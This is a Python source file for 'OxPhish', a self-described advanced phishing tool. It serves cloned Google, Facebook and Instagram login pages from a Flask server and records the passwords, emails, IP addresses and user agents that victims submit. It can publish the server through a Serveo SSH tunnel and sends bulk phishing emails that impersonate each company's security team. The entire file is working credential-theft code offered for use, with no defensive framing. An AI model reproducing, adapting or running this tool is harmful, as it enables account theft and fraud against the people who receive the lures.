import os
import sys
import time
import socket
import random
import threading
import smtplib
import ssl
import subprocess
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime
from flask import Flask, request, render_template, redirect

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

def print_banner():
    os.system('clear' if os.name != 'nt' else 'cls')
    banner = f"""
{Colors.RED}   ▒█████  ▒██   ██▒{Colors.WHITE}  {Colors.BOLD}██▓███   ██░ ██  ██▓  ██████  ██░ ██ {Colors.END}
{Colors.RED}  ▒██▒  ██▒▒▒ █ █ ▒░{Colors.WHITE}  {Colors.BOLD}▓██░  ██▒▓██░ ██▒▓██▒▒██    ▒ ▓██░ ██▒{Colors.END}
{Colors.RED}  ▒██░  ██▒░░  █   ░{Colors.WHITE}  {Colors.BOLD}▓██░ ██▓▒▒██▀▀██░▒██▒░ ▓██▄   ▒██▀▀██░{Colors.END}
{Colors.RED}  ▒██   ██░ ░ █ █ ▒ {Colors.WHITE}  {Colors.BOLD}▒██▄█▓▒ ▒░▓█ ░██ ░██░  ▒   ██▒░▓█ ░██ {Colors.END}
{Colors.RED}  ░ ████▓▒░▒██▒ ▒██▒{Colors.WHITE}  {Colors.BOLD}▒██▒ ░  ░░▓█▒░██▓░██░▒██████▒▒░▓█▒░██▓{Colors.END}
{Colors.RED}  ░ ▒░▒░▒░ ▒▒ ░ ░▓ ░{Colors.WHITE}  {Colors.BOLD}▒▓▒░ ░  ░ ▒ ░░▒░▒░▓  ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒{Colors.END}
{Colors.RED}    ░ ▒ ▒░ ░░   ░▒ ░{Colors.WHITE}  {Colors.BOLD}░▒ ░      ▒ ░▒░ ░ ▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░{Colors.END}
{Colors.RED}  ░ ░ ░ ▒   ░    ░  {Colors.WHITE}  {Colors.BOLD}░░        ░  ░░ ░ ▒ ░░  ░  ░   ░  ░░ ░{Colors.END}
{Colors.RED}      ░ ░   ░    ░  {Colors.WHITE}  {Colors.BOLD}          ░  ░  ░ ░        ░   ░  ░  ░{Colors.END}

{Colors.CYAN}╔══════════════════════════════════════════════════════════════════╗
║ {Colors.YELLOW}Tool        {Colors.WHITE}: OxPhish - Advanced Phishing Tool                 ║
║ {Colors.YELLOW}Version     {Colors.WHITE}: 2.1.0                                           ║
║ {Colors.YELLOW}GitHub      {Colors.WHITE}: https://github.com/OxPhish/OxPhish              ║
{Colors.CYAN}╚══════════════════════════════════════════════════════════════════╝{Colors.END}
"""
    print(banner)

class OxPhish:
    def __init__(self):
        self.host = '127.0.0.1'
        self.port = self.find_available_port()
        self.captured_data = []
        self.selected_template = None
        self.public_url = None
        self.serveo_process = None
        self.email_config = {
            'enabled': False,
            'smtp_server': 'smtp.gmail.com',
            'smtp_port': 587,
            'email': '',
            'password': '',
            'target_list': []
        }
        self.app = Flask(__name__, 
                        template_folder=os.path.join(os.getcwd(), "templates"),
                        static_folder=os.path.join(os.getcwd(), "templates"))
        self.setup_routes()
        
    def find_available_port(self):
        port = 8080
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex((self.host, port))
            sock.close()
            if result != 0:
                return port
            port += 1
    
    def setup_routes(self):
        @self.app.route('/', methods=['GET'])
        def index():
            if self.selected_template == "google":
                return render_template('google.html')
            elif self.selected_template == "facebook":
                return render_template('facebook.html')
            elif self.selected_template == "instagram":
                return render_template('instagram.html')
            else:
                return "Template not selected!"
        
        @self.app.route('/login', methods=['POST'])
        def login():
            username = request.form.get('username', '')
            email = request.form.get('email', '')
            password = request.form.get('password', '')
            
            ip = request.remote_addr
            user_agent = request.headers.get('User-Agent')
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            captured = {
                'timestamp': timestamp,
                'ip': ip,
                'user_agent': user_agent,
                'username': username,
                'email': email,
                'password': password,
                'template': self.selected_template
            }
            
            self.captured_data.append(captured)
            self.save_to_file(captured)
            
            redirect_urls = {
                "google": "https://accounts.google.com",
                "facebook": "https://facebook.com",
                "instagram": "https://instagram.com"
            }
            
            return redirect(redirect_urls.get(self.selected_template, "https://google.com"))
    
    def save_to_file(self, data):
        if not os.path.exists("logs"):
            os.makedirs("logs")
            
        template_name = data['template']
        filename = f"logs/{template_name}_captured_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        with open(filename, "w", encoding="utf-8") as f:
            f.write(f"[+] OxPhish - Captured Data\n")
            f.write(f"[+] Date: {data['timestamp']}\n")
            f.write(f"[+] IP Address: {data['ip']}\n")
            f.write(f"[+] User Agent: {data['user_agent']}\n")
            f.write(f"[+] Template: {data['template']}\n")
            
            if data['username']:
                f.write(f"[+] Username: {data['username']}\n")
            if data['email']:
                f.write(f"[+] Email: {data['email']}\n")
            if data['password']:
                f.write(f"[+] Password: {data['password']}\n")
        
        print(f"\n{Colors.GREEN}[+] Data saved: {filename}{Colors.END}")
        print(f"{Colors.YELLOW}[+] Username/Email: {Colors.WHITE}{data['username'] or data['email']}{Colors.END}")
        print(f"{Colors.YELLOW}[+] Password: {Colors.WHITE}{data['password']}{Colors.END}")
    
    def start_local_server(self):
        try:
            print(f"\n{Colors.GREEN}[+] Starting local server...{Colors.END}")
            
            import logging
            log = logging.getLogger('werkzeug')
            log.setLevel(logging.ERROR)
            
            server_thread = threading.Thread(target=self._run_server)
            server_thread.daemon = True
            server_thread.start()
            
            time.sleep(1)
            
            local_url = f"http://{self.host}:{self.port}"
            
            print(f"{Colors.GREEN}[+] Server running: {Colors.CYAN}{local_url}{Colors.END}")
            print(f"\n{Colors.YELLOW}[+] Phishing URL:{Colors.END}")
            print(f"{Colors.CYAN}{local_url}{Colors.END}")
            
            qr_code = self.generate_qr_code(local_url)
            if qr_code and not qr_code.startswith('[!]'):
                print(f"\n{Colors.YELLOW}[+] QR Code:{Colors.END}")
                print(qr_code)
            
            print(f"\n{Colors.PURPLE}[*] Waiting for data. Press CTRL+C to exit.{Colors.END}")
            return True
        
        except Exception as e:
            print(f"\n{Colors.RED}[!] Failed to start server: {str(e)}{Colors.END}")
            return False
    
    def start_serveo_tunnel(self):
        try:
            print(f"\n{Colors.GREEN}[+] Starting Serveo tunnel...{Colors.END}")
            
            import logging
            log = logging.getLogger('werkzeug')
            log.setLevel(logging.ERROR)
            
            server_thread = threading.Thread(target=self._run_server)
            server_thread.daemon = True
            server_thread.start()
            
            time.sleep(1)
            
            print(f"{Colors.YELLOW}[+] Creating Serveo tunnel to port {self.port}...{Colors.END}")
            
            try:
                self.serveo_process = subprocess.Popen(
                    f"ssh -R 80:localhost:{self.port} serveo.net",
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    universal_newlines=True
                )
                
                for i in range(15):
                    time.sleep(1)
                    if self.serveo_process.poll() is not None:
                        break
                    try:
                        line = self.serveo_process.stdout.readline()
                        if line and "Forwarding" in line:
                            parts = line.strip().split()
                            for part in parts:
                                if part.startswith('https://') and 'serveo.net' in part:
                                    self.public_url = part
                                    break
                            if self.public_url:
                                break
                    except:
                        continue
                
                if self.public_url:
                    print(f"{Colors.GREEN}[+] Serveo tunnel created successfully!{Colors.END}")
                    print(f"\n{Colors.YELLOW}[+] Public Phishing URL:{Colors.END}")
                    print(f"{Colors.CYAN}{self.public_url}{Colors.END}")
                    
                    qr_code = self.generate_qr_code(self.public_url)
                    if qr_code and not qr_code.startswith('[!]'):
                        print(f"\n{Colors.YELLOW}[+] QR Code for public URL:{Colors.END}")
                        print(qr_code)
                    
                    print(f"\n{Colors.PURPLE}[*] Waiting for data. Press CTRL+C to exit.{Colors.END}")
                    return True
                else:
                    print(f"{Colors.RED}[!] Failed to get Serveo URL. Make sure you have SSH access.{Colors.END}")
                    return False
                
            except Exception as e:
                print(f"{Colors.RED}[!] Serveo error: {str(e)}{Colors.END}")
                return False
                
        except Exception as e:
            print(f"\n{Colors.RED}[!] Failed to start Serveo tunnel: {str(e)}{Colors.END}")
            return False
    
    def _run_server(self):
        try:
            self.app.run(host=self.host, port=self.port, debug=False, use_reloader=False)
        except Exception as e:
            print(f"{Colors.RED}[!] Server error: {str(e)}{Colors.END}")
    
    def generate_qr_code(self, url):
        try:
            import qrcode
            
            qr = qrcode.QRCode(
                version=1,
                error_correction=qrcode.constants.ERROR_CORRECT_L,
                box_size=1,
                border=2,
            )
            qr.add_data(url)
            qr.make(fit=True)
            
            matrix = qr.get_matrix()
            qr_ascii = ""
            
            qr_ascii += "┌" + "─" * (len(matrix[0]) * 2) + "┐\n"
            
            for row in matrix:
                qr_ascii += "│"
                for cell in row:
                    if cell:
                        qr_ascii += "██"
                    else:
                        qr_ascii += "  "
                qr_ascii += "│\n"
            
            qr_ascii += "└" + "─" * (len(matrix[0]) * 2) + "┘\n"
            
            return qr_ascii
            
        except ImportError:
            return "[!] Install 'qrcode' module to generate QR codes"
        except Exception as e:
            return f"[!] QR Code generation error: {str(e)}"
    
    def check_template_availability(self):
        templates_path = os.path.join(os.getcwd(), "templates")
        
        if not os.path.exists(templates_path):
            os.makedirs(templates_path)
            print(f"{Colors.RED}[!] Templates folder not found! Created: {templates_path}{Colors.END}")
            
            template_files = {
                "google.html": "Google Login",
                "facebook.html": "Facebook Login",
                "instagram.html": "Instagram Login"
            }
            
            for filename, title in template_files.items():
                filepath = os.path.join(templates_path, filename)
                if not os.path.exists(filepath):
                    with open(filepath, "w") as f:
                        f.write(f"""<!DOCTYPE html>
<html>
<head>
    <title>{title}</title>
</head>
<body>
    <h1>{title}</h1>
    <form action="/login" method="post">
        <input type="text" name="email" placeholder="Email" required><br>
        <input type="password" name="password" placeholder="Password" required><br>
        <button type="submit">Login</button>
    </form>
</body>
</html>""")
            
            return False
        
        available_templates = []
        template_files = ["google.html", "facebook.html", "instagram.html"]
        
        for template_file in template_files:
            template_name = template_file.split('.')[0]
            if os.path.exists(os.path.join(templates_path, template_file)):
                available_templates.append(template_name)
        
        if not available_templates:
            print(f"{Colors.RED}[!] No templates found!{Colors.END}")
            return False
        
        print(f"{Colors.GREEN}[+] Available templates: {', '.join(available_templates)}{Colors.END}")
        return True

    def send_phishing_emails(self, use_public_url=False):
        if not self.email_config['enabled']:
            print(f"{Colors.RED}[!] Email functionality not configured!{Colors.END}")
            return False
        
        if not self.email_config['target_list']:
            print(f"{Colors.RED}[!] No target emails specified!{Colors.END}")
            return False
        
        if use_public_url and self.public_url:
            url = self.public_url
        else:
            url = f"http://{self.host}:{self.port}"
            
        print(f"\n{Colors.YELLOW}[*] Starting email campaign...{Colors.END}")
        print(f"{Colors.GREEN}[+] Using URL in emails: {url}{Colors.END}")
        
        email_templates = {
            "google": {
                "subject": "Security Alert: Unusual Sign-in Attempt",
                "body": f"""
<html>
<body>
<p>Dear User,</p>
<p>We detected an unusual sign-in attempt to your Google Account. Please verify your account information immediately to maintain access.</p>
<p><a href="{url}">Verify Account</a></p>
<p>If you did not request this verification, please secure your account immediately.</p>
<p>Google Security Team</p>
</body>
</html>
"""
            },
            "facebook": {
                "subject": "Facebook: Your account requires immediate attention",
                "body": f"""
<html>
<body>
<p>Hi,</p>
<p>Your Facebook account has been temporarily limited due to suspicious activity. Please verify your identity to restore full access.</p>
<p><a href="{url}">Restore Account Access</a></p>
<p>This is an automated message. Please do not reply.</p>
<p>Facebook Security</p>
</body>
</html>
"""
            },
            "instagram": {
                "subject": "Instagram: Action Required - Account Verification",
                "body": f"""
<html>
<body>
<p>Hello Instagram User,</p>
<p>We've detected unusual activity on your Instagram account. Please verify your credentials to prevent temporary suspension.</p>
<p><a href="{url}">Verify Account</a></p>
<p>If you ignore this message, your account may be temporarily restricted.</p>
<p>Instagram Support Team</p>
</body>
</html>
"""
            }
        }
        
        if self.selected_template not in email_templates:
            print(f"{Colors.RED}[!] No email template available for {self.selected_template}!{Colors.END}")
            return False
        
        template = email_templates[self.selected_template]
        
        try:
            context = ssl.create_default_context()
            server = smtplib.SMTP(self.email_config['smtp_server'], self.email_config['smtp_port'])
            server.ehlo()
            server.starttls(context=context)
            server.ehlo()
            server.login(self.email_config['email'], self.email_config['password'])
            
            sent_count = 0
            failed_count = 0
            
            for target_email in self.email_config['target_list']:
                try:
                    message = MIMEMultipart("alternative")
                    message["Subject"] = template["subject"]
                    message["From"] = self.email_config['email']
                    message["To"] = target_email
                    
                    html_part = MIMEText(template["body"], "html")
                    message.attach(html_part)
                    
                    server.sendmail(
                        self.email_config['email'],
                        target_email,
                        message.as_string()
                    )
                    
                    sent_count += 1
                    print(f"{Colors.GREEN}[+] Email sent to: {target_email}{Colors.END}")
                    time.sleep(2)
                    
                except Exception as e:
                    failed_count += 1
                    print(f"{Colors.RED}[!] Failed to send email to {target_email}: {str(e)}{Colors.END}")
            
            server.quit()
            print(f"\n{Colors.GREEN}[+] Email campaign completed: {sent_count} sent, {failed_count} failed{Colors.END}")
            return True
            
        except Exception as e:
            print(f"{Colors.RED}[!] Email server error: {str(e)}{Colors.END}")
            return False
    
    def configure_email(self):
        print_banner()
        print(f"\n{Colors.CYAN}╔══════════════════════════════════╗")
        print(f"║     {Colors.YELLOW}EMAIL CONFIGURATION{Colors.CYAN}         ║")
        print(f"╚══════════════════════════════════╝{Colors.END}")
        
        self.email_config['email'] = input(f"\n{Colors.YELLOW}[?] Enter your Gmail address: {Colors.END}")
        self.email_config['password'] = input(f"{Colors.YELLOW}[?] Enter your Gmail password/app password: {Colors.END}")
        
        target_input = input(f"\n{Colors.YELLOW}[?] Enter target email(s) separated by commas: {Colors.END}")
        self.email_config['target_list'] = [email.strip() for email in target_input.split(',') if email.strip()]
        
        if not self.email_config['target_list']:
            print(f"{Colors.RED}[!] No valid target emails provided!{Colors.END}")
            return False
        
        self.email_config['enabled'] = True
        print(f"\n{Colors.GREEN}[+] Email configuration complete!{Colors.END}")
        print(f"{Colors.GREEN}[+] {len(self.email_config['target_list'])} target emails configured{Colors.END}")
        return True
    
    def show_menu(self):
        print_banner()
        
        if not self.check_template_availability():
            input(f"\n{Colors.RED}[!] Press ENTER to continue...{Colors.END}")
            return False
        
        print(f"\n{Colors.CYAN}╔══════════════════════════════════╗")
        print(f"║     {Colors.YELLOW}TEMPLATE SELECTION MENU{Colors.CYAN}     ║")
        print(f"╠══════════════════════════════════╣")
        print(f"║ {Colors.WHITE}[1] Google                  {Colors.CYAN}    ║")
        print(f"║ {Colors.WHITE}[2] Facebook                {Colors.CYAN}    ║")
        print(f"║ {Colors.WHITE}[3] Instagram               {Colors.CYAN}    ║")
        print(f"║ {Colors.WHITE}[4] Exit                    {Colors.CYAN}    ║")
        print(f"╚══════════════════════════════════╝{Colors.END}")
        
        choice = input(f"\n{Colors.YELLOW}[?] Your choice (1-4): {Colors.END}")
        
        if choice == "1":
            self.selected_template = "google"
            return True
        elif choice == "2":
            self.selected_template = "facebook"
            return True
        elif choice == "3":
            self.selected_template = "instagram"
            return True
        elif choice == "4":
            print(f"\n{Colors.RED}[!] Exiting...{Colors.END}")
            sys.exit(0)
        else:
            print(f"\n{Colors.RED}[!] Invalid choice. Try again.{Colors.END}")
            time.sleep(1)
            return False
            
    def attack_menu(self):
        print_banner()
        
        print(f"\n{Colors.CYAN}╔══════════════════════════════════╗")
        print(f"║     {Colors.YELLOW}ATTACK METHOD SELECTION{Colors.CYAN}     ║")
        print(f"╠══════════════════════════════════╣")
        print(f"║ {Colors.WHITE}[1] Start with Serveo          {Colors.CYAN} ║")
        print(f"║ {Colors.WHITE}[2] Start with Local Server    {Colors.CYAN} ║")
        print(f"║ {Colors.WHITE}[00] Back to Template Menu     {Colors.CYAN} ║")
        print(f"╚══════════════════════════════════╝{Colors.END}")
        
        choice = input(f"\n{Colors.YELLOW}[?] Your choice (1, 2, 00): {Colors.END}")
        
        if choice == "1":
            if not self.email_config['enabled']:
                if not self.configure_email():
                    input(f"\n{Colors.RED}[!] Email configuration failed. Press ENTER to continue...{Colors.END}")
                    return True
            
            if self.start_serveo_tunnel():
                if self.email_config['enabled']:
                    self.send_phishing_emails(use_public_url=True)
                
                try:
                    while True:
                        time.sleep(1)
                except KeyboardInterrupt:
                    if self.serveo_process:
                        self.serveo_process.terminate()
                    print(f"\n{Colors.YELLOW}[!] Serveo tunnel stopped.{Colors.END}")
            
            return True
            
        elif choice == "2":
            if not self.email_config['enabled']:
                if not self.configure_email():
                    input(f"\n{Colors.RED}[!] Email configuration failed. Press ENTER to continue...{Colors.END}")
                    return True
            
            if self.start_local_server():
                if self.email_config['enabled']:
                    self.send_phishing_emails(use_public_url=False)
                
                try:
                    while True:
                        time.sleep(1)
                except KeyboardInterrupt:
                    print(f"\n{Colors.YELLOW}[!] Server stopped.{Colors.END}")
            
            return True
            
        elif choice == "00":
            return False
        else:
            print(f"\n{Colors.RED}[!] Invalid choice. Try again.{Colors.END}")
            time.sleep(1)
            return True
    

def main():
    try:
        print_banner()
        phish = OxPhish()
        
        while not phish.show_menu():
            pass
        
        while phish.attack_menu():
            pass
        
        main()
            
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}[!] Program terminated...{Colors.END}")
        sys.exit(0)

if __name__ == "__main__":
    main()